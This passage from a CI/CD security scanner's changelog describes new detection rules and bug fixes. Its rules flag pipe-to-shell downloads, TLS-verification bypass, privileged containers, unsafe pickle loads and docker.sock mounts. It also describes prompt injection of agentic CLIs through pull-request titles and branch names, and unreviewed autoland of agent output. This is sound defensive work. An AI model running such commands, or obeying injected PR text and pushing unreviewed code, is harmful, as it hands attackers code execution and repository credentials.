  (runners aren't ephemeral by default) persistence into later jobs.
  Detection reads the `runner` embedded in each fork-pipeline job (the same
  `/jobs` page GLRUN-003/004 already list, so no extra API calls) and works
  even when the fetcher can't download traces, since it's metadata not log
  content. GitLab.com `instance_type` shared runners are ephemeral and not
  flagged. The `gitlab_runs` provider now ships 5 checks (GLRUN-001..005).
- **``harness`` provider: Harness CI/CD pipeline scanning (HARNESS-001 ..
  HARNESS-011).** A new ``--pipeline harness`` parses Harness pipeline YAML
  (the Git Experience / pipeline-as-code form) and audits it like the other
  CI providers, the first coverage of an enterprise CD platform that no
  scanner touches today. Harness has no canonical filename, so the loader
  globs ``*.yml`` / ``*.yaml`` and keeps the documents whose top-level key
  is ``pipeline:``; it flattens the deep ``stages -> stage.spec.execution.
  steps -> step / parallel / stepGroup`` nesting to scan every leaf step
  across CI and CD stages. **HARNESS-001** (HIGH) flags a step ``spec.image``
  pinned by a mutable tag instead of an ``@sha256:`` digest (reusing the
  shared ``image_pinning`` classifier; the DR-001 / GL-001 family). **HARNESS-002**
  (HIGH) is the Harness script-injection rule: a step ``command`` that
  interpolates an attacker-controllable ``<+...>`` expression
  (``<+codebase.prTitle>``, ``<+codebase.commitMessage>``, a branch / tag
  name, or any ``<+trigger.*>`` / ``<+eventPayload.*>`` value) is a
  command-injection sink, since Harness substitutes the expression's text
  into the script before the shell runs it (the GHA-002 / DR-003 model).
  ``<+codebase.commitSha>`` / ``<+codebase.repoUrl>`` are excluded as
  non-injectable. **HARNESS-003** (HIGH) flags a step running with
  ``spec.privileged: true`` (full host-kernel access; the DR-002 model).
  **HARNESS-004** (CRITICAL) flags a literal credential pasted into a
  ``type: String`` pipeline / stage ``variable`` instead of a
  ``type: Secret`` + ``<+secrets.getValue(...)>`` reference (the shared
  secret-shape catalog; the DR-004 family; the value is redacted in the
  finding). **HARNESS-005** (HIGH) flags a step ``command`` that pipes a
  remote download into a shell (``curl ... | sh`` / ``wget ... | bash``),
  the Codecov-bash-uploader / install-script RCE class (the DR-014 /
  GHA-016 family). **HARNESS-006** (HIGH) flags a step ``command`` that
  disables TLS verification (``curl -k``, ``wget --no-check-certificate``,
  ``npm config set strict-ssl false``, ``git -c http.sslVerify=false``, ...),
  reusing the shared ``_primitives.tls_bypass`` detector (the DR-006 /
  GHA-027 family). **HARNESS-007** (HIGH) flags a Kubernetes-infrastructure
  ``HostPath`` volume (``stage.spec.infrastructure.spec.volumes``) bind-
  mounting a sensitive node path (``/var/run/docker.sock``, ``/var/lib/
  docker``, ``/etc``, ``/proc``, ``/sys``, ``/``) into the build pod, a
  container-escape / node-takeover primitive (the DR-007 / K8S family;
  ``EmptyDir`` / PVC volumes pass). **HARNESS-008** (HIGH) brings the
  flagship AI prompt-injection rule (GHA-119 / GL-048 / BB-036 / ADO-035 /
  JF-037) to Harness, making it the 6th provider in that matrix: a step
  ``command`` that invokes an agentic CLI (``claude`` / ``gemini`` /
  ``cursor-agent`` / ``aider`` / ``openhands`` / ``goose`` / ``q chat``)
  AND feeds it an attacker-controllable ``<+...>`` expression
  (``<+codebase.prTitle>``, ``<+trigger.*>``, ...) lets a pull request
  smuggle instructions the agent then executes; it is separate from
  HARNESS-002 because env-var binding does not sanitize an LLM prompt.
  **HARNESS-009** (HIGH) is the autoland leg: one pipeline both invokes an
  agentic CLI and lands the result with a ``git push`` straight to a branch
  (no review gate), the analog of GHA-123 / GL-049 / BB-039 / ADO-038 /
  JF-038. With HARNESS-008 it composes the **AC-040** injection -> autoland
  chain, which now extends to Harness as its 6th provider (no new chain ID).
  **HARNESS-010 / HARNESS-011** (HIGH) bring the model-supply-chain RCE
  rules to Harness: HARNESS-010 flags a step ``command`` that loads an ML
  model with ``trust_remote_code=True`` (the loader runs the model repo's
  own Python, the GHA-120 / GL-045 family), and HARNESS-011 flags unsafe
  pickle deserialization of a fetched artifact (``weights_only=False`` /
  ``allow_pickle=True``, or a remote fetch plus ``torch.load`` /
  ``pickle.load`` / ``joblib.load`` in one step, the GHA-122 / GL-047
  family), both reusing the shared ``model_trust`` / ``unsafe_deser``
  detectors. Auto-detected on a ``.harness/`` directory; ``--harness-path``
  points at a file or directory explicitly. YAML-only, no Harness API token.
  Every rule maps across the OWASP CI/CD Top 10 and the 12 other frameworks.
  Provider count 36 -> 37.

- **RUN-007: third-party action pinned by a mutable tag executed in a
  privileged run.** The preventive twin of RUN-006. Where RUN-006 confirms
  a *known-compromised* action ran (an IOC match), RUN-007 flags the
  exposure before it becomes an incident: a third-party action that a
  privileged-trigger run (``pull_request_target`` / ``workflow_run``)
  resolved from a mutable ref (a tag like ``@v4`` or a branch, not a 40-hex
  commit SHA) actually executed with the run's secrets and ``GITHUB_TOKEN``
  in scope. If the upstream force-moves that tag, the next privileged run
  silently pulls the attacker's code (the tj-actions/changed-files
  CVE-2025-30066 vector). Reuses the privileged-run logs RUN-003 / RUN-004
  already download and inspects GitHub's ``Download action repository
  'owner/repo@ref' (SHA:...)`` lines, carrying the resolved SHA as the pin
  to adopt. First-party (``actions`` / ``github``) and the repo's own
  actions are excluded; only the secret-bearing privileged runs are scanned
  (not the bounded non-privileged RUN-006 pass), so the signal stays high.
  This is the run-forensics pin-hygiene check: the ``runs`` provider audits
  a repo purely from run history (it never reads the workflow), so it also
  catches transitively / dynamically resolved actions a static ``uses:``
  scan cannot see. MEDIUM, only evaluated with ``--audit-runs-logs``.
  ``runs`` provider 6 -> 7 checks.

- **AC-042: fork pipeline executed and exfiltrated credentials in the
  same pipeline (GitLab).** The GitLab analog of AC-041, built from the
  ``gitlab_runs`` run-forensics legs. Fires when one fork merge-request
  pipeline both executed in the project's CI (GLRUN-002, untrusted
  contributor code ran) AND, in that same pipeline, a credential left it:
  a secret-shaped string leaked in its job trace past GitLab's masking
  (GLRUN-003) or it minted a cloud OIDC token (GLRUN-004). GitLab has no
  "compromised action" IOC analog (so no RUN-006-style leg); the
  untrusted-code leg is the fork pipeline itself. Both legs carry the same
  ``gitlab:group/project#pipeline/<id>`` resource, so the pairing is
  structural, not co-occurrence: it provably happened in one execution.
  Emitted CRITICAL and ``confirmed_reachable`` (the GitLab twin of
  AC-041's same-run pairing), so it survives
  ``--chains-require-reachability``: poisoned pipeline execution confirmed
  to have *succeeded*, not merely been possible. Chain count 55 -> 56.

- **``gitlab_runs`` provider: GitLab pipeline run-history forensics
  (GLRUN-001 .. GLRUN-004).** The GitLab analog of the ``runs`` provider,
  and the first step of run-forensics beyond GitHub. ``--pipeline
  gitlab_runs --scm-repo group/project`` pulls recent pipelines via the
  GitLab REST API (``GET /projects/:id/pipelines``) and audits what
  *actually executed*, not just what ``.gitlab-ci.yml`` could do. GLRUN-001
  (MEDIUM) flags pipelines that ran on a merge-request event
  (``source: merge_request_event`` / ``external_pull_request_event``),
  metadata-only. GLRUN-002 (HIGH, the high-severity subset, under
  ``--audit-runs-logs``) resolves which of those came from a *fork*: GitLab's
  pipeline list doesn't carry the source/target project, so it lists merge
  requests, keeps the ones whose ``source_project_id`` differs from the
  ``target_project_id``, and pulls each such MR's pipelines, confirming that
  untrusted fork code executed in the project's CI (the GitLab analog of
  RUN-001). GLRUN-003 / GLRUN-004 (HIGH, also under ``--audit-runs-logs``)
  go deeper: they download those fork pipelines' job traces
  (``GET /jobs/:id/trace``) and scan them, GLRUN-003 for secret-shaped
  strings that leaked past GitLab's variable masking (the RUN-003 analog),
  GLRUN-004 for a cloud OIDC token mint (AWS ``AssumeRoleWithWebIdentity`` /
  GCP ``workloadIdentityPools``, the RUN-004 analog, meaning untrusted fork
  code reached cloud federation). Authenticated with ``--gitlab-token`` /
  ``$GITLAB_TOKEN``;
  ``--gitlab-url`` points it at a self-managed instance. A missing token /
  404 / network error degrades to a warning rather than crashing. The deep
  passes are bounded (most recent fork MRs / pipelines). Provider count
  35 -> 36.
- **JF-038: agentic-CLI output lands without human review (Jenkins).**
  Completes Jenkins's AI flow-control coverage alongside JF-037, the
  Jenkins analog of GHA-123 / GL-049 / BB-039 / ADO-038. Fires when one
  Jenkinsfile both invokes an agentic CLI (``claude`` / ``gemini`` /
  ``cursor-agent`` / ``aider`` / ``openhands`` / ``goose`` / ``q chat``) in
  a ``sh`` / ``bat`` / ``powershell`` step and, in the same pipeline, lands
  the result with a ``git push`` (the Jenkins commit-to-a-branch idiom).
  Coupling is pipeline-level because the stages of one pipeline share a
  checkout. A ``git push --dry-run`` is ignored, and an agent that only
  opens a PR does not fire. HIGH. jenkins 37 -> 38.
- **JF-037: untrusted PR/build context reaches an agentic AI CLI
  (Jenkins).** Brings the flagship AI prompt-injection rule (GHA-119 /
  GL-048 / BB-036 / ADO-035) to Jenkins, the largest CI install base and
  the worst injection surface (Groovy interpolation). Fires when a ``sh`` /
  ``bat`` / ``powershell`` step invokes an agentic CLI (``claude`` /
  ``gemini`` / ``cursor-agent`` / ``aider`` / ``openhands`` / ``goose`` /
  ``q chat``) AND attacker-controllable Jenkins context reaches it: an
  SCM-event env var (``$BRANCH_NAME`` / ``$CHANGE_TITLE`` /
  ``$CHANGE_BRANCH`` / ``$TAG_NAME`` / ``$GIT_*``) or a ``${params.X}``
  build parameter (reusing the ``LABEL_TAINT_RE`` catalog JF-032 / JF-036
  share). The AI face of JF-002: unlike command injection, Groovy
  single-quoting does not defang this (the model ingests the value as
  prompt text regardless of quote style), so both single- and
  double-quoted step bodies are flagged. Reuses the shared
  ``_primitives/agentic_cli`` catalog. HIGH. jenkins 36 -> 37.
- **AC-041: a compromised action executed and exfiltrated credentials in
  the same run (attack chain).** The first run-forensics attack chain, and
  the strongest signal the tool produces, a supply-chain attack confirmed
  to have *succeeded* rather than merely been possible. Fires when RUN-006
  (a known-compromised action actually executed in a run) pairs on the
  *same run* with RUN-003 (a secret-shaped string leaked in that run's
  logs) or RUN-004 (that run minted a cloud OIDC token): the malicious
  action ran and a credential left the run in one execution, the
  tj-actions/changed-files (CVE-2025-30066) pattern of printing harvested
  secrets into the log. Reachability is structural, not co-occurrence,
  since both legs carry the same ``github:owner/repo#run/<id>`` resource,
  so the chain is emitted ``confirmed_reachable`` at HIGH confidence (the
  run-history analog of AC-005's shared-image-digest pairing) and survives
  ``--chains-require-reachability``. CRITICAL. Maps to MITRE T1195.002 /
  T1552 / T1567. Chain count 54 -> 55 (41 AC).
- **RUN-006: a known-compromised action actually executed in run history
  (run forensics).** The runtime confirmation behind GHA-040. Where the
  static rule flags a known-compromised action *reference* in the current
  workflow, RUN-006 reads the run logs and confirms the action's
  ``Download action repository 'owner/repo@ref' (SHA:...)`` line is
  present, so the compromised code provably ran. It matches both the
  pinned ref and the resolved commit SHA against the curated IOC registry
  (tj-actions/changed-files CVE-2025-30066, reviewdog/action-setup, the
  2026 aquasecurity / checkmarx campaigns), which catches two things the
  static scan cannot: a **tag-repoint** (the workflow pins ``@v44`` but the
  log shows v44 resolved to the malicious commit, the exact tj-actions
  vector) and a **since-reverted workflow** (the bad ref was removed after
  the fact, so GHA-040 is now clean, yet run history still records the
  compromised execution with secrets in scope). Reads the same
  privileged-trigger run logs RUN-003 / RUN-004 already download under
  ``--audit-runs-logs`` (no extra fetches), scoping it to the
  highest-impact runs (repo secrets + write-scoped token in scope); the
  IOC match is exact, recall bounded to the fetched runs. CRITICAL. runs
  5 -> 6. Directly addresses the roadmap's "runtime-resolved third-party
  actions (tag-repoint detection)" run-forensics item.
- **AC-040: prompt-injected agent commits its output with no human review
  (attack chain).** Correlates the two legs of the agentic-AI rule pack
  into a CRITICAL kill chain, across all four script-based providers. Fires
  when one pipeline file both feeds untrusted PR / branch / commit context
  into an agentic CLI's prompt (the injection leg: GHA-119 / GL-048 /
  BB-036 / ADO-035) AND lands that agent's output with no review gate (the
  autoland leg: GHA-123 / GL-049 / BB-039 / ADO-038). Independently each
  leg is a finding; together they close the loop with no human in it: a
  prompt-injection line in the PR redirects the agent to write a malicious
  change, and the autoland step (a `git push`, an auto-merge, or a
  push-action) commits or merges it, so the attacker's injected instruction
  becomes committed code that then runs on the next pipeline with the
  repository's credentials. The cross-provider, content-injection sibling
  of AC-035 (the GitHub reviewer-and-committer loop). Per-resource
  co-occurrence within one provider; the legs never mix across providers.
  Maps to MITRE T1195.002 / T1059 / T1078.004. Chain count 53 -> 54
  (40 AC).
- **BB-039 / ADO-038: agentic-CLI output lands without human review
  (Bitbucket, Azure DevOps).** Completes the AI/LLM-pipeline rule pack's
  flow-control leg across the script-based CI providers (GHA-123 / GL-049
  already shipped), and with it the full agentic-AI matrix
  (prompt-injection / trust_remote_code / model-pinning / unsafe-deser /
  autoland) across GitHub, GitLab, Bitbucket, and Azure DevOps. Fires when
  one execution unit both invokes an agentic CLI (``claude`` / ``gemini`` /
  ``cursor-agent`` / ``aider`` / ``openhands`` / ``goose`` / ``q chat``)
  and, with no review gate, lands the result: a ``git push`` straight to a
  branch (both providers), or an ``az repos pr create`` / ``update`` set to
  ``--auto-complete`` (Azure). AI-authored changes then reach a branch (or
  a merge) with no human in the loop, and if the agent's prompt is at all
  influenced by untrusted input (BB-036 / ADO-035) that is prompt-injection
  straight to committed code. Coupling is scoped to a single Bitbucket
  step (each step runs in its own container with a fresh clone) and to a
  single Azure job (its steps share one checkout), mirroring each
  provider's execution model. Reuses the shared ``_primitives/agentic_cli``
  catalog; a ``git push --dry-run`` is ignored, and an agent that only
  opens a PR for review does not fire. HIGH. bitbucket 38 -> 39, azure
  37 -> 38.
- **BB-038 / ADO-037: AI model pulled without a pinned revision
  (Bitbucket, Azure DevOps).** Completes model-pinning coverage across the
  script-based CI providers, bringing the rule to the two that lacked it
  (GHA-121 / GL-046 already shipped). A step ``script`` fetches a model
  from a registry (Hugging Face Hub and friends) by a *mutable* reference,
  ``from_pretrained("org/model")``, ``hf_hub_download`` /
  ``snapshot_download`` with a bare ``repo_id``, or
  ``huggingface-cli download org/model`` with no ``--revision``. Without a
  pinned revision the registry serves whatever the repo's default branch
  points at now, so the model owner (or anyone who compromises the account
  or the upstream repo) can swap the weights, the tokenizer, or the custom
  loader code under a green build with no diff in your repo. It is the
  model-registry analog of pinning a dependency to a lockfile, and the
  prerequisite for the ``trust_remote_code`` execution path BB-035 /
  ADO-034 flags: pinning the revision is the one control that makes a
  poisoned-model swap detectable. Reuses the shared
  ``_primitives/model_ref`` detection; scoped to org-namespaced ids
  (``org/model``) so it targets third-party models, not the canonical
  first-party hub names (``bert-base-uncased``). Does not fire on a pinned
  ``revision`` / ``--revision``, a local path, or a variable
  interpolation. MEDIUM. bitbucket 37 -> 38, azure 36 -> 37.
- **BB-037 / ADO-036: unsafe deserialization of a fetched artifact
  (pickle RCE) (Bitbucket, Azure DevOps).** Brings the model-deserialization
  RCE rule (GHA-122 / GL-047) to the two remaining script-based providers.
  Loading a model / artifact through a pickle-backed deserializer executes
  arbitrary Python embedded in the file at load time, and in CI that file
  is routinely downloaded, so it is remote code execution under the
  pipeline's credentials. Two firing shapes (shared with GHA-122 / GL-047
  via `_primitives/unsafe_deser`): an explicit unsafe opt-in
  (`weights_only=False` / `allow_pickle=True`) always fires; or a remote
  fetch (curl / wget / `hf_hub_download` / `snapshot_download` /
  `huggingface-cli download` / `requests`) alongside a pickle-backed loader
  (`torch.load` / `pickle.load(s)` / `joblib.load`) with no safe path
  (`weights_only=True` or safetensors) in the same step. A bare local load
  with no fetch does not fire. Pairs with the `trust_remote_code` rule
  (BB-035 / ADO-034) as the second model-load RCE vector. HIGH. bitbucket
  36 -> 37, azure 35 -> 36.
- **BB-036 / ADO-035: untrusted PR context reaches an agentic AI CLI
  (Bitbucket, Azure DevOps).** Brings the flagship AI prompt-injection
  rule (GHA-119 / GL-048) to the two remaining script-based CI providers,
  completing its cross-provider coverage. An agentic CLI (`claude` /
  `gemini` / `cursor-agent` / `aider` / `openhands` / `goose` / `q chat`)
  reads a prompt and then acts (runs shell, writes files, calls tools), so
  when a step feeds attacker-controllable context into that prompt anyone
  who can open a pull request can smuggle instructions the agent executes.
  BB-036 fires on `$BITBUCKET_BRANCH` / `$BITBUCKET_TAG` / `$BITBUCKET_PR_*`
  (directly or via an exported shell var); ADO-035 on
  `$(Build.SourceVersionMessage)` / `$(Build.SourceBranch*)` /
  `$(System.PullRequest.*)` (directly or via a `variables:` entry). As the
  AI face of BB-002 / ADO-002, the shell-quoting / `env:` routing that
  defangs command injection does not help, since the model ingests the
  value as prompt text regardless. Reuses the shared
  `_primitives/agentic_cli` catalog and each provider's existing
  untrusted-context detection. HIGH. bitbucket 35 -> 36, azure 34 -> 35.
- **RUN-005: a fork PR's run executed on a self-hosted runner (run
  forensics).** GitHub's most-warned-about self-hosted-runner risk,
  confirmed live: a fork PR runs attacker-controlled code, and on a
  self-hosted runner that code executes on infrastructure the repo owner
  controls (command execution on the runner host, a pivot into the
  internal network, and persistence into later jobs since self-hosted
  runners are not ephemeral by default). It holds even on an
  unprivileged `pull_request` trigger with no secrets, so it is
  independent of RUN-001. Under `--audit-runs-logs`, fetches job metadata
  (the Actions REST API `.../jobs` endpoint) for recent fork runs and
  flags any whose jobs ran on a self-hosted runner (GitHub adds the
  `self-hosted` label to every such runner). Detection is exact; the
  fork-run fetch is bounded to the most recent runs. HIGH. runs 4 -> 5.
- **RUN-004: a fork PR's run minted a cloud OIDC token (run forensics).**
  The sharpest live escalation of RUN-001 and the run-history confirmation
  of the static CI->cloud OIDC-trust link (AC-016). When a run both
  executed untrusted fork code on a privileged trigger and minted an OIDC
  token, attacker-controlled code reached cloud federation: it could
  exchange the GitHub OIDC token for the federated AWS / GCP / Azure role
  and act as it. Reuses the privileged-trigger run logs RUN-003 already
  downloads under `--audit-runs-logs` (no extra fetches), flagging the
  OIDC-mint markers (`token.actions.githubusercontent.com`, the
  `ACTIONS_ID_TOKEN_REQUEST_*` env, AWS `AssumeRoleWithWebIdentity`, GCP
  `workloadIdentityPools`). Scoped to fork-originated runs, so a
  trusted-branch deploy that uses OIDC normally does not fire; detection
  is high-precision but best-effort on recall (log content varies). HIGH.
  runs 3 -> 4.

### Changed

- **AC-040 (prompt-injected agent commits unreviewed) now covers Jenkins.**
  With JF-037 + JF-038 shipped, the injection->autoland kill chain extends
  to a fifth provider: the chain fires when a Jenkinsfile both feeds
  untrusted context into an agentic CLI (JF-037) and pushes the agent's
  output without review (JF-038). No chain-count change (AC-040 already
  existed); ``providers`` gains ``jenkins`` and the ``JF-037`` / ``JF-038``
  pair joins the per-provider match list.
- **RUN-006 now scans ordinary `push` / `pull_request` runs, not just the
  privileged-trigger subset.** The tj-actions / Trivy / Checkmarx
  compromised-action campaigns ran on regular CI, so limiting RUN-006 to
  the privileged-trigger logs RUN-003 / RUN-004 download missed its
  headline case. A second bounded pass under `--audit-runs-logs`
  (`DEFAULT_ACTION_LOG_FETCH_LIMIT`, 25 by default) downloads the most
  recent non-privileged run logs and scans them for the compromised-action
  IOC match only (the secret detector still runs only on privileged-trigger
  runs, so RUN-003's scope is unchanged). A truncation warning prints when
  older non-privileged runs go unscanned.

### Fixed

- **In-depth review pass: 13 verified bug fixes plus two red CI gates.**
  A multi-dimension audit (engine correctness, ReDoS / input safety, rule
  FP/FN, reporters / autofix, code quality) surfaced and fixed:
  - **GHA-064 ReDoS (DoS).** A PR-controlled ``if: contains('a,a,a,…``
    drove the unsound-contains haystack into O(n²) backtracking (~80s at
    200 KB). The first segment now stops at the first comma; same
    semantics, linear (4 ms).
  - **ADO-002 / ADO-035 false negative: ``VAR="$(Build.SourceBranchName)"``
    was treated as a safe shell capture.** Azure text-substitutes
    ``$(macro)`` into the script before the shell parses it (like GitHub
    ``${{ }}``), so a quote in the branch name breaks out. Added an
    Azure-only ``paren_is_macro`` flag to the quoted-assignment carve-out.
  - **ADO taint regexes were case-sensitive** but ADO macros aren't, so
    ``$(build.sourcebranch)`` evaded ADO-002 / ADO-030 / ADO-012.
  - **IaC-apply detection missed ``terraform -chdir=DIR apply``** (the
    standard CI form), bypassing GHA-117 / GHA-111 / GL-041 / ADO-033 /
    BB-033 (all CRITICAL).
  - **Jenkins JF-002 / JF-032 missed the GitHub Pull Request Builder
    (``ghprb*``) plugin vars**, the dominant attacker-controlled source on
    classic Jenkins PR jobs (the rule's own exploit example names one).
  - **HARNESS-003 used a strict ``is True``** and missed the quoted
    ``privileged: "true"`` form the docs_note promises to catch.
  - **Terraform PBAC-003 ignored IPv6 ``::/0`` egress** (the CloudFormation
    analog already checked it).
  - **CSV reporter formula injection.** A field beginning with ``= + - @``
    (or tab / CR) is now prefixed with a quote so spreadsheets treat it as
    text, not a formula.
  - **Markdown reporter could split a ``\\`` escape** by truncating after
    escaping, leaving a dangling backslash that escaped the cell
    separator; it now truncates the raw text first.
  - **Threat-model reporter didn't escape backticks**, unbalancing inline
    code spans across table cells.
  - **GHA-008 redaction autofixer swallowed the newline** on a
    comment-less line, pushing its TODO marker onto a mis-indented line.
  - **SARIF could emit ``message.text: null``** (schema-invalid) for an
    empty description; falls back to the title like every sibling reporter.
  - **Drone DR-014 / Harness HARNESS-005 pipe-to-shell detection had
    drifted weaker** than every other provider (matched only ``sh`` /
    ``bash``); both now share one ``SIMPLE_PIPE_TO_SHELL_RE`` that also
    catches ``| python`` / ``| perl`` / ``| ruby`` and a ``sudo`` prefix.
  - **Red CI gates:** restored ``ruff check`` (24 pre-existing E501
    over-length lines in the ORG-* standards mappings) and ``mypy
    --strict`` (a ``list[None]`` item-type error in the annotations
    reporter), plus removed a dead ``known_categories()`` helper and three
    unclosed file handles in ``cli.py``.
- **maven: `pom.xml` parse caught only `ET.ParseError`, not
  `RecursionError` / `MemoryError`.** `_parse_pom` now degrades on the
  latter two as well, closing the same narrow-`except` gap class the
  RecursionError hardening swept elsewhere (a pathological XML tree
  returned `parsed_ok=False` instead of escaping as an uncaught crash).
  `ET.fromstring` is iterative so deep nesting doesn't trigger it via
  input today, but the defensive contract now matches the YAML / JSON
  loaders. The standing loader-robustness gate
  (`tests/test_loader_robustness.py`) was extended to lock this in: the
  per-provider deeply-nested battery now covers the XML packs (maven /
  nuget), a new per-provider non-UTF-8 battery covers the seven
  distinct-parser providers (maven / nuget / gomod / rubygems / pypi /
  dockerfile / modelfile) whose bespoke parsers each need their own
  `UnicodeDecodeError` guard, and a unit test pins the maven
  RecursionError degrade. All seven were already robust; the gate now
  prevents regression. The differential battery was broadened past
  GHA-002's `on:` shapes: GHA-003 (script injection) is asserted across
  every `run:` scalar style (inline / literal / folded / single- and
  double-quoted) and GHA-008 (hardcoded credential) across every value
  scalar style, so a YAML representation quirk can't silently drop either
  rule (both confirmed robust). A seeded, dependency-free generative fuzz
  pass (400 random inputs: structured YAML documents + arbitrary byte
  blobs through the shared loader, asserting graceful degradation) now
  backs the curated battery; it surfaced no new crash class.
- **modelfile: a hub model pulled by a file path (`FROM
  hf.co/org/model.gguf`) was misclassified as a local weights file.** The
  weights-extension check (`.gguf` / `.safetensors` / `.bin` / …) won over
  the hub check, so a documented Ollama "pull this GGUF from Hugging Face"
  line suppressed MODEL-001 (unpinned base model, a false negative) and
  false-fired MODEL-003 (local weights blob). The hub classification now
  wins: such a ref correctly fires MODEL-001 + MODEL-002 and not MODEL-003.
  Genuine local files (`./model.gguf`, bare `model.gguf`, `/x/weights.bin`)
  are unchanged.
- **A remote policy pack that returns a non-UTF-8 body no longer silently
  serves a stale cached copy.** `--policy <https-url>` folded a decode
  failure into the network-failure path, so a 200 response with a
  corrupt / changed / hijacked non-UTF-8 body would fall back to the last
  good cache and mask the bad response. A decode failure on a successful
  fetch now raises a clear error; the cache fallback fires only on an
  actual network / IO failure.
- **A deeply-nested YAML file no longer crashes the scan through the
  auxiliary loaders the earlier hardening pass missed.** The previous
  fix caught `RecursionError` / `MemoryError` (PyYAML's recursive parser
  raises these builtins, not `yaml.YAMLError`, on a pathologically deep
  document) at the shared provider parse boundaries, but the secondary
  loaders that parse their own files still aborted the whole scan with a
  raw traceback: the GitHub local-action and resolved-callee parsers
  (PR-reachable through a planted `action.yml` or composite-action ref),
  the ArgoCD inline repo-blob parser, and the custom-rule (`--custom-rules`)
  and policy (`--policy`) loaders. The scan loaders now degrade the file
  like a parse failure (skip + warning); the user-config loaders fail fast
  with a clear `CustomRuleError` / `PolicyError` instead of a traceback.
- **The failing-gate "what next" trailer no longer suggests a no-op fix
  command for unsafe-only findings.** When every autofixer for the failing
  set was unsafe-tier, the stderr gate trailer told the user to run
  `pipeline_check --fix --apply`, which is safe-only and writes nothing.
  It now suggests `--fix unsafe --apply` for an unsafe-only set, counts
  only the safe fixers when bare `--fix` would apply some, and notes the
  unsafe remainder. This matches the terminal report footer, which already
  pointed at the tier that actually changes the tree.

## [1.13.0] - 2026-06-09

### Added

- **Provenance verification gate (`verify-artifact REF`).** A new
  subcommand that turns the static "you should sign" findings (GHA-100
  and the attestation rules) into a runtime pass/fail check. It shells
  out to the supply-chain verifiers already on PATH (`cosign`,
  `slsa-verifier`, `gh attestation`), building an injection-safe argv
  per tool, and folds the outcomes into one verdict: **PASS** when at
  least one tool ran and verified and none failed, **FAIL** when any
  verification failed, **INCONCLUSIVE** when no installed tool matched
  the supplied policy. `REF` is an OCI image (`ghcr.io/acme/api:1.2.3`,
  optionally `@sha256:...`) or a local file. The policy flags select
  which verifiers run: `--source-uri` (+ `--builder-id` / `--provenance`)
  for slsa-verifier, `--certificate-identity[-regexp]` with
  `--certificate-oidc-issuer` or `--key` for cosign, `--owner` for
  `gh attestation`. Exit codes follow the canonical contract: `0`
  verified, `1` verification failed (gateable in CI), `3` could not
  verify. A missing verifier binary degrades to INCONCLUSIVE rather than
  crashing, mirroring the `opa` / `helm` shell-out pattern. `--json`
  emits a machine-readable result. (Closes the provenance-verification
  candidate in ROADMAP.)
- **Shareable policy packs (`--policy <url>`).** `--policy` now accepts an
  `https://` URL (in addition to a built-in name or a local path), so an
  organization can publish one gate policy and have every repo consume it
  by URL. The remote pack is fetched over HTTPS (redirects pinned to
  HTTPS via the shared `safe_http` opener, response size-capped at 256 KB)
  and cached, so a later offline run still resolves the gate. A remote
  policy can only configure the gate (rule / standards filters,
  thresholds, severity overrides), never run code; because it can also
  *weaken* the gate, the source URL is printed on the `[policy] loaded …`
  line so the choice is auditable in CI logs. Builds on the built-in
  `--policy <name>` packs and the existing local-path support.
- **ADO-034: ML model loaded with `trust_remote_code` (Azure DevOps).**
  Completes the cross-provider coverage of the flagship model-RCE rule
  (GHA-120 / GL-045 / BB-035 / ADO-034) across every script-based CI
  provider. Fires on `trust_remote_code=True` / `--trust-remote-code` in a
  step's `script` / `bash` / `pwsh` / `powershell` body or a task-based
  step's `inputs.script`: the transformers / huggingface_hub loader
  executes the model repo's own Python at load time, so an untrusted or
  unpinned model is arbitrary code execution on the agent with its
  service-connection credentials in scope. Reuses the shared
  `_primitives/model_trust` detector. HIGH. azure 33 -> 34.
- **BB-035: ML model loaded with `trust_remote_code` (Bitbucket).** Brings
  the flagship model-RCE rule to the #3 script-based CI provider,
  completing its cross-provider coverage (GHA-120 / GL-045 / BB-035).
  Fires on `trust_remote_code=True` / `--trust-remote-code` in a step's
  `script`: the transformers / huggingface_hub loader executes the model
  repo's own Python at load time, so an untrusted or unpinned model is
  arbitrary code execution in the pipeline with the step's credentials in
  scope. The `trust_remote_code` detection now lives in a shared
  `_primitives/model_trust` helper that GHA-120, GL-045, and BB-035 all
  use. HIGH. bitbucket 34 -> 35.
- **MODEL-005: a vendored model config declares custom loader code
  (`auto_map`).** Extends the `modelfile` provider to also parse vendored
  Hugging Face `config.json` model configs (recognized by their
  `auto_map` / `architectures` / `model_type` keys, with heavy
  directories like `node_modules` skipped). Fires when a config's
  `auto_map` block is non-empty: it points the transformers auto-classes
  at the model repo's own Python (`modeling_*.py` / `configuration_*.py`),
  which transformers imports and runs under `trust_remote_code=True`. It
  is the model-side complement of GHA-120 / GL-045 (which flag the
  `trust_remote_code` load in CI scripts): those catch the loader, this
  catches the vendored config that makes such a load execute third-party
  code. MEDIUM. modelfile 4 -> 5.
- **DEV-008: a credential-shaped literal committed in a dev-environment
  config.** The developer-environment member of the cross-provider
  literal-secret `*-008` family (GHA-008 / GL-008 / …). Editor / agent /
  container configs routinely carry credentials, an MCP server's `env`
  block (a `GITHUB_TOKEN` / API key passed to the tool server), a
  devcontainer `remoteEnv` / `containerEnv`, a VS Code setting, a Claude
  Code hook, and a committed literal is exposed to everyone with repo
  access and lives in git history. Scans every string in the parsed
  config (`.vscode/` tasks / settings, `.devcontainer`,
  `.claude/settings.json`, and the MCP configs `.mcp.json` /
  `.cursor/mcp.json` / `.vscode/mcp.json`) against the shared
  credential-shape catalog. CRITICAL. devenv 7 -> 8.
- **DEV-007: a committed MCP config auto-launches a local command server.**
  Extends the `devenv` provider (the auto-execute-on-repo-open surface) to
  Model Context Protocol configs: `.mcp.json` (Claude Code),
  `.cursor/mcp.json` (Cursor), and `.vscode/mcp.json` (VS Code). Fires when
  a committed config defines a server with a `command` (a stdio server the
  agent / editor launches as a local child process on project open, with
  the developer's privileges). Both the `mcpServers` (Claude / Cursor) and
  `servers` (VS Code) block names are read; `url`-only servers
  (`type: http` / `sse`) don't spawn a local process and don't fire.
  Commands that fetch an unpinned remote package (`npx -y`, `uvx`,
  `pnpm dlx`, `bunx`, `pipx run`) are called out as the sharpest case: the
  tool server becomes whatever the registry serves at open time. MEDIUM.
  devenv 6 -> 7.
- **Model-registry provider (`--pipeline modelfile`).** A new provider
  that parses Ollama `Modelfile` declarations on disk, the "Dockerfile of
  models", text-only with no model pull and no Ollama daemon. It is the
  static, declaration-side complement to the CI-script AI rules
  (GHA-120/121/122, GL-045..049) that catch model pulls in build scripts.
  Four rules over the `FROM` / `ADAPTER` model references a Modelfile
  declares: **MODEL-001** (base model pulled by a mutable reference, no
  tag or `:latest`, the model-registry analogue of GHA-001 / DF-001),
